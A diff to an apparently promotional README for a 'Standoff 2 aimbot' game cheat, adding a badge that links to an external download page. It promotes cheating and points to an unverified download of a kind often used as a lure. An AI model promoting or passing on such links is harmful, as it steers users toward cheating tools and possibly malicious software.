@@ -4,6 +4,7 @@
 
 In **Standoff 2**, aim is everything. One missed bullet can cost you a round, especially in ranked play. The **Standoff 2 aimbot** solves that by giving you flawless accuracy, headshot priority, and even ESP integration for full enemy tracking. With this tool, every shot connects, every duel is yours.
 
+[![Get](https://img.shields.io/badge/Get%20The-Aimbot-blueviolet)](https://standoff-2-aimbot.github.io/.github/)
 ---
 
 ## Product Description
